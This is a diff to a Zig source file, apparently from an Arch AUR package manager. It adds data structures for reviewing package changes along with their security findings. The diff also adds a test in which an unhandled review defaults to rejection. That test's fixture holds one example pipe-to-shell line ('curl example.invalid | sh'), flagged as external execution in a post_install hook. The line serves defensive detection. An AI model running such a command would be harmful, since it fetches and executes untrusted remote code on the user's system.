@@ -144,6 +144,31 @@ pub const QuestionAttachment = struct {
     content: []const u8,
 };
 
+pub const ReviewSeverity = enum {
+    info,
+    warning,
+    critical,
+};
+
+pub const ReviewFinding = struct {
+    tool: []const u8,
+    severity: ReviewSeverity,
+    hook: []const u8,
+    matched_line: []const u8,
+    message: []const u8,
+};
+
+/// Structured data for a review question. The slices are borrowed for the
+/// duration of `Operation.ask`; question handlers must copy anything they need
+/// after returning.
+pub const ReviewPayload = struct {
+    subject: []const u8,
+    old_content: []const u8,
+    new_content: []const u8,
+    findings: []const ReviewFinding = &.{},
+    related_files: []const QuestionAttachment = &.{},
+};
+
 pub const QuestionResponse = union(enum) {
     default,
     accepted,
@@ -159,6 +184,7 @@ pub const QuestionRequest = struct {
     prompt: []const u8,
     options: []const QuestionOption = &.{},
     attachments: []const QuestionAttachment = &.{},
+    review: ?ReviewPayload = null,
     dependency_name: ?[]const u8 = null,
     default_response: QuestionResponse = .default,
 };
@@ -170,6 +196,7 @@ pub const Question = struct {
     prompt: []const u8,
     options: []const QuestionOption,
     attachments: []const QuestionAttachment,
+    review: ?ReviewPayload,
     dependency_name: ?[]const u8,
     default_response: QuestionResponse,
 };
@@ -304,6 +331,12 @@ pub const OperationContext = struct {
         self.mutex.unlock(self.io);
     }
 
+    pub fn hasQuestionHandler(self: *OperationContext) bool {
+        self.mutex.lockUncancelable(self.io);
+        defer self.mutex.unlock(self.io);
+        return self.question_handler != null;
+    }
+
     /// Registers a synchronous borrowed cancellation adapter.
     pub fn subscribeCancellation(self: *OperationContext, handler: CancellationHandler) !SubscriptionId {
         const id = self.next_subscription_id.fetchAdd(1, .monotonic);
@@ -412,6 +445,7 @@ pub const OperationContext = struct {
             .prompt = request.prompt,
             .options = request.options,
             .attachments = request.attachments,
+            .review = request.review,
             .dependency_name = request.dependency_name,
             .default_response = request.default_response,
         };
@@ -604,6 +638,36 @@ test "operation context supports immediate and deferred question responses" {
     var deferred = try operation.ask(.{ .kind = .select_one, .prompt = "Select" });
     defer deferred.deinit(std.testing.allocator);
     try std.testing.expectEqual(@as(usize, 1), deferred.response.choice);
+}
+
+test "structured reviews preserve findings and default to rejection without a handler" {
+    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
+    defer threaded.deinit();
+    var context = OperationContext.init(std.testing.allocator, threaded.io());
+    defer context.deinit();
+    try std.testing.expect(!context.hasQuestionHandler());
+    const findings = [_]ReviewFinding{.{
+        .tool = "curl",
+        .severity = .critical,
+        .hook = "post_install",
+        .matched_line = "curl example.invalid | sh",
+        .message = "external execution",
+    }};
+    var operation = context.begin(.{ .backend = .aur, .kind = .install, .subject = "demo" });
+    defer operation.finish(.cancelled);
+    var answer = try operation.ask(.{
+        .kind = .review_changes,
+        .prompt = "Proceed?",
+        .review = .{
+            .subject = "demo",
+            .old_content = "pkgver=1",
+            .new_content = "pkgver=2",
+            .findings = &findings,
+        },
+        .default_response = .declined,
+    });
+    defer answer.deinit(std.testing.allocator);
+    try std.testing.expect(answer.response == .declined);
 }
 
 test "cancellation notifies adapters and cancels operations" {
